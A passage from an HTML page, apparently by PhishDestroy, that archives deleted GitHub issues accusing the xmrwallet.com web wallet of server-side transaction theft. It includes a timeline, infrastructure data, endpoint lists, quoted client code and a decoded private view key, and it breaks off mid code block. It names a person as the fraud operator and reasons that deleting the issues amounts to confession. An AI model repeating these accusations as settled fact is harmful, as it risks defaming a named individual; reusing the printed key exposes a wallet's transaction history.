@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DELETED EVIDENCE &#x2014; xmrwallet.com GitHub Issues #35 &amp; #36 &#x2014; Archived by PhishDestroy</title>
+<meta name="description" content="Archived GitHub issues #35 and #36 from XMRWallet/Website &#x2014; deleted by operator after .biz and .cc domains were suspended. Full technical evidence preserved.">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="xmrwallet.com DELETED evidence &#x2014; archived by PhishDestroy">
+<meta property="og:description" content="Operator deleted GitHub issues #35 and #36 after .biz and .cc were suspended. Full archive here.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Bebas+Neue&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,400&display=swap" rel="stylesheet">
+<style>
+:root{--red:#FF2020;--orange:#FF7A00;--yellow:#FFD600;--green:#00FF88;--blue:#4A9EFF;--bg:#080808;--bg2:#0F0F0F;--bg3:#161616;--border:#1E1E1E;--border2:#2A2A2A;--text:#E0E0E0;--muted:#555;--mono:'Space Mono',monospace;--display:'Bebas Neue',sans-serif;--body:'DM Sans',sans-serif;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:15px;line-height:1.7;overflow-x:hidden;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:999;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:12px 40px;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);}
+.nav-logo{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--red);letter-spacing:2px;text-transform:uppercase;text-decoration:none;}
+.nav-links{display:flex;gap:20px;}
+.nav-links a{font-family:var(--mono);font-size:10px;color:var(--muted);text-decoration:none;letter-spacing:1px;transition:color 0.2s;}
+.nav-links a:hover{color:var(--text);}
+.section{padding:60px 80px;border-top:1px solid var(--border);position:relative;}
+.section-label{font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--red);text-transform:uppercase;margin-bottom:16px;}
+.section-title{font-family:var(--display);font-size:clamp(36px,5vw,68px);line-height:1;color:#fff;margin-bottom:20px;letter-spacing:1px;}
+.section-intro{font-size:15px;color:#888;max-width:700px;margin-bottom:32px;line-height:1.9;}
+.code-block{background:#000;border:1px solid var(--border);border-left:3px solid var(--red);padding:20px 24px;font-family:var(--mono);font-size:12px;line-height:2;overflow-x:auto;margin:16px 0;white-space:pre;}
+.c-url{color:#7EB8FF;}.c-key{color:var(--orange);}.c-val{color:var(--green);}.c-red{color:var(--red);font-weight:700;}.c-muted{color:#3a3a3a;}.c-yellow{color:var(--yellow);}
+.ioc-table{width:100%;border-collapse:collapse;margin-top:24px;font-family:var(--mono);font-size:12px;}
+.ioc-table th{text-align:left;padding:10px 16px;background:var(--bg3);color:var(--muted);font-size:10px;letter-spacing:2px;border:1px solid var(--border);}
+.ioc-table td{padding:12px 16px;border:1px solid var(--border);color:#888;vertical-align:top;}
+.ioc-table td:first-child{color:var(--orange);white-space:nowrap;}
+.ioc-table td.red{color:var(--red);}
+.ioc-table tr:hover td{background:var(--bg3);}
+.screenshot-frame{background:#0a0a0a;border:1px solid var(--border2);border-top:3px solid var(--red);margin:24px 0;overflow:hidden;}
+.screenshot-frame-bar{background:var(--bg3);padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);}
+.dot{width:10px;height:10px;border-radius:50%;}
+.dot.r{background:#ff5f56;}.dot.y{background:#ffbd2e;}.dot.g{background:#27c93f;}
+.screenshot-url{font-family:var(--mono);font-size:10px;color:var(--muted);margin-left:8px;}
+.screenshot-frame img{width:100%;display:block;}
+.del-banner{background:#000;border:2px solid var(--red);border-left:6px solid var(--red);padding:24px 32px;margin:32px 0;position:relative;overflow:hidden;}
+.del-banner::before{content:'DELETED';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-15deg);font-family:var(--display);font-size:120px;color:rgba(255,32,32,0.04);pointer-events:none;white-space:nowrap;}
+.del-banner-title{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--red);letter-spacing:2px;margin-bottom:12px;}
+.del-banner p{font-size:13px;color:#666;line-height:1.9;}
+.archive-box{background:#000307;border:1px solid rgba(74,158,255,0.2);border-left:4px solid var(--blue);padding:20px 26px;margin:24px 0;font-family:var(--mono);font-size:12px;line-height:2;}
+.archive-box-title{color:var(--blue);letter-spacing:2px;font-size:9px;font-weight:700;margin-bottom:12px;}
+.archive-box a{color:var(--blue);text-decoration:none;}
+.archive-box a:hover{text-decoration:underline;}
+.issue-header{background:var(--bg2);border:1px solid var(--border);border-top:3px solid var(--red);padding:24px 28px;margin:24px 0 0 0;}
+.issue-number{font-family:var(--display);font-size:48px;color:rgba(255,32,32,0.15);float:right;line-height:1;}
+.issue-title{font-family:var(--mono);font-size:13px;color:#fff;font-weight:700;margin-bottom:8px;}
+.issue-meta{font-family:var(--mono);font-size:10px;color:var(--muted);}
+.issue-meta .open{color:var(--green);font-weight:700;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);padding:2px 8px;margin-right:8px;}
+.issue-meta .deleted{color:var(--red);font-weight:700;background:rgba(255,32,32,0.1);border:1px solid rgba(255,32,32,0.2);padding:2px 8px;margin-right:8px;}
+.issue-body{background:var(--bg2);border:1px solid var(--border);border-top:none;padding:28px;}
+.issue-body h3{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--orange);letter-spacing:2px;text-transform:uppercase;margin:24px 0 12px;}
+.issue-body h3:first-child{margin-top:0;}
+.issue-body p{font-size:13px;color:#888;line-height:1.9;margin-bottom:12px;}
+.issue-body ul{margin:8px 0 16px 20px;}
+.issue-body li{font-size:13px;color:#777;line-height:1.8;}
+.issue-body .highlight{color:var(--red);font-weight:400;}
+.issue-body code{font-family:var(--mono);font-size:11px;color:#aaa;background:#111;padding:2px 6px;border:1px solid var(--border);}
+.cards-2{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);margin:24px 0;}
+.card2{background:var(--bg2);padding:22px 24px;}
+.card2-title{font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);text-transform:uppercase;margin-bottom:8px;}
+.card2-val{font-family:var(--mono);font-size:13px;color:var(--text);word-break:break-all;line-height:1.6;}
+.card2-val.red{color:var(--red);}.card2-val.green{color:var(--green);}.card2-val.orange{color:var(--orange);}
+.req-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:1px;background:var(--border);margin:24px 0;}
+.req-item{background:var(--bg2);padding:16px 18px;}
+.req-endpoint{font-family:var(--mono);font-size:11px;color:var(--blue);margin-bottom:4px;}
+.req-count{font-family:var(--display);font-size:36px;color:var(--red);line-height:1;}
+.req-label{font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px;}
+.req-item.danger{background:#0a0000;border-left:2px solid var(--red);}
+.req-item.backdoor{background:#050010;border-left:2px solid #ff00ff;}
+.req-item.backdoor .req-count{color:#ff00ff;}
+.req-item.backdoor .req-endpoint{color:#ff88ff;}
+.timeline{display:flex;flex-direction:column;gap:0;margin:32px 0;}
+.tl-item{display:flex;gap:24px;padding:18px 0;border-bottom:1px solid var(--border);}
+.tl-date{font-family:var(--mono);font-size:11px;color:var(--muted);width:140px;flex-shrink:0;padding-top:3px;}
+.tl-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:6px;}
+.tl-dot.red{background:var(--red);box-shadow:0 0 6px var(--red);}
+.tl-dot.green{background:var(--green);box-shadow:0 0 6px var(--green);}
+.tl-dot.blue{background:var(--blue);}
+.tl-content{flex:1;}
+.tl-title{font-size:14px;color:var(--text);margin-bottom:4px;}
+.tl-sub{font-size:12px;color:var(--muted);}
+.session-decode{background:#000;border:1px solid var(--border);padding:0;margin:24px 0;overflow:hidden;}
+.sd-header{background:var(--bg3);padding:12px 20px;font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:2px;border-bottom:1px solid var(--border);}
+.sd-row{display:grid;grid-template-columns:80px 1fr;gap:0;border-bottom:1px solid var(--border);}
+.sd-row:last-child{border-bottom:none;}
+.sd-label{background:rgba(255,32,32,0.05);padding:14px 16px;font-family:var(--mono);font-size:10px;color:var(--red);border-right:1px solid var(--border);display:flex;align-items:center;}
+.sd-val{padding:14px 16px;font-family:var(--mono);font-size:11px;color:#666;word-break:break-all;line-height:1.6;}
+.sd-val .decoded{color:var(--green);display:block;font-size:11px;}
+.sd-val .label{color:var(--muted);font-size:9px;letter-spacing:1px;display:block;margin-bottom:4px;}
+.warning-big{background:#080000;border:2px solid rgba(255,32,32,0.4);padding:32px;margin:32px 0;text-align:center;}
+.warning-big-icon{font-family:var(--display);font-size:80px;color:rgba(255,32,32,0.2);line-height:1;}
+.warning-big-text{font-family:var(--mono);font-size:14px;color:var(--red);letter-spacing:2px;margin-top:12px;}
+.warning-big-sub{font-size:13px;color:#555;margin-top:8px;line-height:1.8;}
+.vt-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);margin:24px 0;}
+.vt-item{background:var(--bg2);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;}
+.vt-vendor{font-family:var(--mono);font-size:11px;color:#888;}
+.vt-verdict-mal{font-family:var(--mono);font-size:11px;color:var(--red);font-weight:700;}
+.vt-verdict-phi{font-family:var(--mono);font-size:11px;color:var(--orange);font-weight:700;}
+.vt-verdict-clean{font-family:var(--mono);font-size:11px;color:#333;}
+.vt-score{background:#0a0000;border:1px solid rgba(255,32,32,0.2);padding:20px 24px;display:flex;align-items:center;gap:24px;margin:24px 0;}
+.vt-num{font-family:var(--display);font-size:72px;color:var(--red);line-height:1;}
+.vt-info{font-family:var(--mono);font-size:11px;color:#555;line-height:2;}
+footer{padding:40px 80px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;}
+.footer-left{font-family:var(--mono);font-size:11px;color:var(--muted);}
+.footer-left a{color:var(--red);text-decoration:none;}
+.footer-right{display:flex;gap:20px;}
+.footer-right a{font-family:var(--mono);font-size:11px;color:var(--muted);text-decoration:none;}
+.footer-right a:hover{color:var(--text);}
+@keyframes blink{50%{opacity:0}}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:0.7}}
+@media(max-width:768px){.section{padding:60px 20px;}nav{padding:12px 20px;}.nav-links{display:none;}.cards-2,.vt-grid{grid-template-columns:1fr;}footer{padding:32px 20px;flex-direction:column;}.tl-date{width:100px;font-size:10px;}}
+</style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="index.html">&#x26a0; PhishDestroy</a>
+  <div class="nav-links">
+    <a href="index.html">&#x2190; Main Report</a>
+    <a href="#issue35">Issue #35</a>
+    <a href="#issue36">Issue #36</a>
+    <a href="#network">Network Evidence</a>
+    <a href="#virustotal">VirusTotal</a>
+    <a href="#deletion">Deletion Log</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section style="min-height:60vh;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;padding:120px 80px 60px;position:relative;overflow:hidden;border-bottom:1px solid var(--border);">
+  <div style="position:absolute;top:-200px;right:-200px;width:600px;height:600px;background:radial-gradient(circle,rgba(255,32,32,0.06) 0%,transparent 65%);pointer-events:none;animation:pulse 4s ease-in-out infinite;"></div>
+  <div style="font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:4px;color:var(--red);text-transform:uppercase;margin-bottom:20px;display:flex;align-items:center;gap:10px;">
+    <span style="width:8px;height:8px;background:var(--red);border-radius:50%;animation:blink 1.2s step-end infinite;flex-shrink:0;display:inline-block;"></span>
+    ARCHIVED &#x2014; OPERATOR DELETED ORIGINALS &#x2014; 2026-02-23
+  </div>
+  <h1 style="font-family:'Bebas Neue',sans-serif;font-size:clamp(48px,8vw,100px);line-height:0.95;letter-spacing:2px;color:#fff;margin-bottom:16px;">
+    <span style="color:#2a2a2a;">DELETED</span><br>
+    <span style="color:var(--red);">EVIDENCE</span><br>
+    <span style="color:#2a2a2a;">ARCHIVE</span>
+  </h1>
+  <p style="font-family:var(--mono);font-size:12px;color:var(--muted);margin-bottom:32px;max-width:700px;line-height:2.2;">
+    <span style="color:#888;">GitHub Issues</span> <span style="color:var(--red);">#35</span> + <span style="color:var(--red);">#36</span> <span style="color:#888;">from XMRWallet/Website &#x2014; deleted by operator nathroy (Nathalie Roy) after xmrwallet.biz and xmrwallet.cc were suspended.</span><br>
+    <span style="color:#333;">Archived:</span> <span style="color:#555;">2026-02-23</span> &nbsp;&#xb7;&nbsp;
+    <span style="color:#333;">#35 published:</span> <span style="color:#555;">2026-02-13</span> &nbsp;&#xb7;&nbsp;
+    <span style="color:#333;">#36 published:</span> <span style="color:#555;">2026-02-18</span> &nbsp;&#xb7;&nbsp;
+    <span style="color:#333;">Deleted by:</span> <span style="color:var(--red);">nathroy (operator)</span>
+  </p>
+  <div style="display:flex;gap:1px;background:var(--border);margin-bottom:40px;flex-wrap:wrap;">
+    <div style="background:var(--bg2);padding:18px 28px;text-align:center;">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--red);line-height:1;">2</div>
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px;">ISSUES DELETED</div>
+    </div>
+    <div style="background:var(--bg2);padding:18px 28px;text-align:center;">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--red);line-height:1;">43</div>
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px;">REQS W/ VIEWKEY</div>
+    </div>
+    <div style="background:var(--bg2);padding:18px 28px;text-align:center;">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--red);line-height:1;">6</div>
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px;">VT DETECTIONS</div>
+    </div>
+    <div style="background:var(--bg2);padding:18px 28px;text-align:center;">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--red);line-height:1;">2</div>
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px;">DOMAINS SUSPENDED</div>
+    </div>
+    <div style="background:#000307;padding:18px 28px;text-align:center;border-left:2px solid rgba(255,0,255,0.3);">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:#ff44ff;line-height:1;">10</div>
+      <div style="font-family:var(--mono);font-size:9px;color:#aa44aa;letter-spacing:1px;margin-top:2px;">BACKDOOR REQS</div>
+    </div>
+    <div style="background:#000a00;padding:18px 28px;text-align:center;border-left:2px solid rgba(0,255,136,0.3);">
+      <div style="font-family:'Bebas Neue',sans-serif;font-size:42px;color:var(--green);line-height:1;">21+</div>
+      <div style="font-family:var(--mono);font-size:9px;color:#336655;letter-spacing:1px;margin-top:2px;">TOTAL DELETED ISSUES</div>
+    </div>
+  </div>
+  <div class="archive-box" style="max-width:800px;">
+    <div class="archive-box-title">// CACHED COPIES &#x2014; BEFORE OPERATOR DELETION</div>
+    <span style="color:#444;">Yandex Cache Issue #35:</span> <a href="https://yandexwebcache.net/yandbtm?fmode=inject&tm=1771884073&tld=com&lang=en&la=1771353856&text=https%3A//github.com/XMRWallet/Website/issues/35&url=https%3A//github.com/XMRWallet/Website/issues/35&l10n=en&mime=html&sign=e201f8864cd5d9e64b5e9369f9c94372&keyno=0&mode=html" target="_blank">yandexwebcache.net &#x2192;</a><br>
+    <span style="color:#444;">Wayback Machine #35:</span> <a href="https://web.archive.org/web/2026*/https://github.com/XMRWallet/Website/issues/35" target="_blank">web.archive.org &#x2192;</a> &nbsp;&nbsp;
+    <span style="color:#444;">Wayback Machine #36:</span> <a href="https://web.archive.org/web/2026*/https://github.com/XMRWallet/Website/issues/36" target="_blank">web.archive.org &#x2192;</a><br>
+    <span style="color:#333;font-size:10px;">// THIS PAGE IS THE PRIMARY ARCHIVE. Screenshots below captured BEFORE deletion.</span>
+  </div>
+</section>
+
+<!-- DELETION TIMELINE -->
+<section class="section" id="deletion">
+  <div class="section-label">Evidence of Coverup</div>
+  <h2 class="section-title">THE DELETION<br>TIMELINE</h2>
+  <p class="section-intro">After xmrwallet.biz and xmrwallet.cc were suspended by registrars, the operator silently deleted GitHub issues #35 and #36. Full documented sequence below.</p>
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-date">2016-??-??</div>
+      <div class="tl-dot blue"></div>
+      <div class="tl-content">
+        <div class="tl-title">xmrwallet.com registered &#x2014; NameSilo &#xb7; paid until 2031</div>
+        <div class="tl-sub">8+ years of operation. Server fraud mechanism active since at least 2018. Over 10,000&#x2013;50,000+ victim wallets estimated.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2018-11-06</div>
+      <div class="tl-dot" style="background:#555;"></div>
+      <div class="tl-content">
+        <div class="tl-title">Last public GitHub commit &#x2014; ZERO commits for next 5.3 years</div>
+        <div class="tl-sub">Production code continued evolving in secret. session_key, verification, encrypted data &#x2014; all added without public visibility.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2024-03-15</div>
+      <div class="tl-dot" style="background:#555;"></div>
+      <div class="tl-content">
+        <div class="tl-title">v0.18.0.0 sanitized dump pushed &#x2014; session_key/verification intentionally excluded</div>
+        <div class="tl-sub">Fraud-critical code kept out of public repo. GitHub maintained as legitimacy facade only.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2026-02-04</div>
+      <div class="tl-dot red"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:rgba(255,100,100,0.8);">OPERATOR PANIC &#x2014; xmrwallet.cc secretly registered</div>
+        <div class="tl-sub">PublicDomainRegistry.com &#xb7; AS57724 DDOS-GUARD Russia &#xb7; 8 YEARS PREPAID. Escape domain infrastructure being built.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2026-02-09</div>
+      <div class="tl-dot red"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:rgba(255,100,100,0.8);">xmrwallet.biz secretly registered &#x2014; 5 days after .cc</div>
+        <div class="tl-sub">WebNic.cc &#xb7; AS59692 IQWeb Belize &#xb7; 5 YEARS PREPAID &#xb7; 4 registry locks incl. serverTransferProhibited. Maximum evasion configuration.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2026-02-13</div>
+      <div class="tl-dot blue"></div>
+      <div class="tl-content">
+        <div class="tl-title">Issue #35 published by PhishDestroy &#x2014; TX hijacking mechanism exposed</div>
+        <div class="tl-sub">raw_tx_and_hash.raw=0 proof, session_key structure, all PHP endpoints, operator identity. Operator begins private messaging campaign claiming "wrong domain".</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2026-02-15</div>
+      <div class="tl-dot blue"></div>
+      <div class="tl-content">
+        <div class="tl-title">Extended code analysis posted &#x2014; 5.3yr commit gap, "swept" TX type, Nathalie Roy identified</div>
+        <div class="tl-sub">Full GitHub vs production divergence documented. Cover-up evidence catalogued. Loss estimation: 5,000&#x2013;50,000+ XMR stolen over 8 years.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date">2026-02-18</div>
+      <div class="tl-dot blue"></div>
+      <div class="tl-content">
+        <div class="tl-title">Issue #36 published &#x2014; live network capture JSON evidence attached</div>
+        <div class="tl-sub">43 requests transmitting private view key. Backdoor session_id=8de50123dab32 documented. 2 wallets fully compromised as proof. Hard cryptographic evidence.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date" style="color:var(--green);">2026-02-??</div>
+      <div class="tl-dot green"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:var(--green);">&#x2705; xmrwallet.biz SUSPENDED &#x2014; WebNic.cc acted on abuse report</div>
+        <div class="tl-sub" style="color:rgba(0,255,136,0.5);">4 registry locks + serverTransferProhibited = irrelevant. 5yr prepayment wasted. Server disconnected.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date" style="color:var(--green);">2026-02-??</div>
+      <div class="tl-dot green"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:var(--green);">&#x2705; xmrwallet.cc SUSPENDED &#x2014; PublicDomainRegistry.com acted</div>
+        <div class="tl-sub" style="color:rgba(0,255,136,0.5);">8yr prepayment wasted. PDR responded despite historically slow abuse handling.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date" style="color:var(--red);">2026-02-23</div>
+      <div class="tl-dot red"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:var(--red);">&#x1f5d1; OPERATOR DELETES ISSUES #35 AND #36 &#x2014; repo content wiped</div>
+        <div class="tl-sub" style="color:rgba(255,80,80,0.6);">Nathalie Roy / nathroy silently deletes both issues after domain suspensions. No rebuttal. No counter-evidence. Just deletion. The 21st+ deleted issue. Classic confession behavior.</div>
+      </div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-date" style="color:var(--green);">2026-02-23</div>
+      <div class="tl-dot green"></div>
+      <div class="tl-content">
+        <div class="tl-title" style="color:var(--green);">This archive page deployed. Evidence preserved permanently.</div>
+        <div class="tl-sub">xmrwallet.com still active via NameSilo. Continue reporting: <span style="color:var(--blue);">abuse@namesilo.com</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="del-banner">
+    <div class="del-banner-title">&#x26a0; WHY DELETION = CONFESSION</div>
+    <p>In 8+ years of operation, across 20+ deleted GitHub issues, 50+ removed reviews, and hundreds of victim reports &#x2014; the operator has <strong style="color:var(--red);font-weight:400;">never once</strong> produced a technical counter-argument. Zero network captures showing the view key is NOT transmitted. Zero code showing the signed transaction IS broadcast. Zero explanation for raw_tx_and_hash.raw = 0.</p>
+    <p style="margin-top:8px;">A legitimate project wrongly accused would post a rebuttal. What happened instead: two escape domains registered in secret, silent deletion after both were suspended. This is the most powerful evidence of all.</p>
+  </div>
+</section>
+
+<!-- SCREENSHOTS -->
+<section class="section" id="issue35">
+  <div class="section-label">Archived &#x2014; GitHub Issue #35</div>
+  <h2 class="section-title">ISSUE #35<br>ORIGINAL SCREENSHOTS</h2>
+  <p class="section-intro">Captured before deletion. Status: <strong style="color:var(--green);font-weight:400;">Open</strong> at time of capture. Deleted by operator after both domains were suspended.</p>
+
+  <div class="screenshot-frame">
+    <div class="screenshot-frame-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="screenshot-url">github.com/XMRWallet/Website/issues/35 &#x2014; [DELETED] &#x2014; Yandex Cache preserved</span>
+    </div>
+    <img src="img/issue35-overview.png" alt="GitHub Issue #35 overview &#x2014; xmrwallet.com Fake Monero Wallet (Server-Side TX Hijacking)" loading="lazy">
+  </div>
+
+  <div class="screenshot-frame" style="margin-top:8px;">
+    <div class="screenshot-frame-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="screenshot-url">Issue #35 &#x2014; &#xa7;1.1 PHP API Endpoints + session_key decoded from live traffic</span>
+    </div>
+    <img src="img/issue35-endpoints.png" alt="Issue #35 &#x2014; PHP endpoints table and session_key structure" loading="lazy">
+  </div>
+
+  <div class="screenshot-frame" style="margin-top:8px;">
+    <div class="screenshot-frame-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="screenshot-url">Issue #35 &#x2014; &#xa7;1.3 Production Auth Flow (not in GitHub) + subaddress generation</span>
+    </div>
+    <img src="img/issue35-authflow.png" alt="Issue #35 &#x2014; Production vs GitHub auth flow divergence" loading="lazy">
+  </div>
+
+  <!-- FULL TEXT ISSUE #35 -->
+  <div class="issue-header" id="issue35-text" style="margin-top:40px;">
+    <div class="issue-number">#35</div>
+    <div class="issue-title">xmrwallet.com &#x2014; Fake Monero Wallet (Server-Side TX Hijacking)</div>
+    <div class="issue-meta">
+      <span class="deleted">&#x1f5d1; DELETED BY OPERATOR</span>
+      <span class="open">was: &#x25cf; Open</span>
+      phishdestroy &#xb7; opened 2026-02-13 &#xb7; deleted ~2026-02-23 &#xb7;
+      <a href="https://yandexwebcache.net/yandbtm?fmode=inject&tm=1771884073&tld=com&lang=en&la=1771353856&text=https%3A//github.com/XMRWallet/Website/issues/35&url=https%3A//github.com/XMRWallet/Website/issues/35&l10n=en&mime=html&sign=e201f8864cd5d9e64b5e9369f9c94372&keyno=0&mode=html" target="_blank" style="color:var(--blue);font-family:var(--mono);font-size:10px;">Yandex Cache &#x2192;</a>
+    </div>
+  </div>
+  <div class="issue-body">
+    <h3>Summary</h3>
+    <p>xmrwallet.com operates as a malicious Monero web wallet. Seed generation is client-side (cnUtil), but all transaction logic is handled server-side, enabling full control over user funds.</p>
+    <p>External scans: <a href="https://urlquery.net/report/a56ea134-19f0-467f-88c3-3444f5c49c06" target="_blank" style="color:var(--blue);font-family:var(--mono);font-size:11px;">urlquery.net &#x2192;</a> &nbsp; <a href="https://www.virustotal.com/gui/domain/www.xmrwallet.com" target="_blank" style="color:var(--blue);font-family:var(--mono);font-size:11px;">virustotal.com &#x2192;</a></p>
+
+    <h3>Technical Details</h3>
+    <ul>
+      <li>Seed generated in-browser via <code>cnUtil</code></li>
+      <li><code>auth.php</code> collects: address, view key, spend key signature (verification)</li>
+      <li>Session: <code>session_key = encrypted_token : base64(address) : base64(viewkey)</code></li>
+      <li>Frontend TX disabled &#x2192; <span class="highlight">raw_tx_and_hash.raw = 0</span></li>
+      <li>TX sent to <code>/submittransaction.php</code> with metadata only</li>
+      <li>Payload: <code>{amount, address, payment_id, fee}</code> &#x2014; server builds actual TX</li>
+    </ul>
+
+    <h3>Impact</h3>
+    <ul>
+      <li>Server builds + broadcasts TX using server-held keys</li>
+      <li><span class="highlight">Destination address can be silently modified to any address</span></li>
+      <li>Full fund compromise &#x2014; victim UI shows no valid TxID for stolen funds</li>
+    </ul>
+
+    <h3>Infrastructure</h3>
+    <ul>
+      <li>IP: 186.2.165.49 (DDoS-Guard, AS59692) &#xb7; NS: ns1/ns2.ddos-guard.net</li>
+      <li>Backend: Apache/2.4.58 (Ubuntu) &#xb7; PHP 8.2.29</li>
+      <li>Registrar: NameSilo (2016 &#x2192; 2031) &#xb7; SSL: Let's Encrypt (Jan 2026)</li>
+      <li>Hosting: IQWeb FZ-LLC (offshore, abuse-resistant) &#xb7; $550+/month custom plan</li>
+    </ul>
+
+    <h3>&#xa7;1.1 PHP API Endpoints &#x2014; GitHub vs Production</h3>
+    <div class="code-block"><span class="c-muted">// Endpoints with production-only parameters (absent from GitHub):</span>
+
+<span class="c-key">auth.php</span>              address, viewkey, isnew, <span class="c-red">timestamp</span>, <span class="c-red">verification</span>
+<span class="c-key">getbalance.php</span>        session_id, <span class="c-red">session_key</span>, <span class="c-red">data</span> (encrypted blob)
+<span class="c-key">getheightsync.php</span>     session_id, <span class="c-red">session_key</span>
+<span class="c-key">gettransactions.php</span>   session_id, <span class="c-red">session_key</span>, page, sort
+<span class="c-key">getoutputs.php</span>        session_id, <span class="c-red">session_key</span>
+<span class="c-key">getunspentoutputs.php</span> session_id, <span class="c-red">session_key</span>
+<span class="c-key">getrandomoutputs.php</span>  session_id, <span class="c-red">session_key</span>, outputindex, mixin
+<span class="c-key">submittransaction.php</span> session_id, <span class="c-red">session_key</span>, tx, tx_info
+<span class="c-key">logout.php</span>            session_id
+
+<span class="c-red">// All bolded = production-only, NOT present in GitHub code.</span></div>
+
+    <h3>&#xa7;1.2 session_key Decoded</h3>
+    <div class="code-block"><span class="c-muted">// session_key structure (sent with every authenticated request):</span>
+<span class="c-red">[97-byte encrypted blob] : [base64(wallet_address)] : [base64(private_viewkey)]</span>
+
+<span class="c-muted">// Decoded from captured traffic:</span>
+Part 0: 97-byte server token (from auth.php response)
+Part 1: NDVHZzZU... &#x2192; <span class="c-val">45Gg6TkiFWWXAxDiVZTffmRbmGpebeQTgcM4hP9oy2dSjimahuHk...</span>
+Part 2: MDI0ZGYx... &#x2192; <span class="c-red">024df1838206fd34a380bd9b6c181af1ffecce60fb9e09317ab42a5aad660a02</span>
+                    <span class="c-red">&#x2191; PRIVATE VIEW KEY transmitted to server on every request</span></div>
+
+    <h3>&#xa7;1.3 Production Auth Flow (NOT in GitHub)</h3>
+    <div class="code-block"><span class="c-muted">// GitHub version &#x2014; 2-part response:</span>
+<span class="c-key">if</span>(returned_data.length == <span class="c-val">2</span>) {{ session_id = returned_data[1]; }}
+
+<span class="c-muted">// Production version &#x2014; 3-part response:</span>
+<span class="c-key">if</span>(returned_data.length == <span class="c-val">3</span>) {{
+    session_id  = returned_data[<span class="c-val">1</span>];
+    session_key = returned_data[<span class="c-val">2</span>] + <span class="c-val">":"</span> + btoa(xmrwallet_address) + <span class="c-val">":"</span> + btoa(xmrwallet_viewkey);
+}}
+<span class="c-red">// &#x2191; Client appends address + viewkey in Base64 to server token</span>
+<span class="c-red">// &#x2191; This combined value is transmitted to server on every subsequent request</span></div>
+
+    <h3>&#xa7;2 The Fraud Mechanism &#x2014; TX Signing Bypass (raw_tx_and_hash.raw = 0)</h3>
+    <div class="code-block"><span class="c-muted">// Present in BOTH GitHub and production &#x2014; the smoking gun:</span>
+
+signed_transaction = cnUtil.create_transaction(pubkeys, seckeys, ...);
+
+<span class="c-muted">// Signed TX is DISCARDED:</span>
+<span class="c-key">var</span> raw_tx_and_hash = {{}};
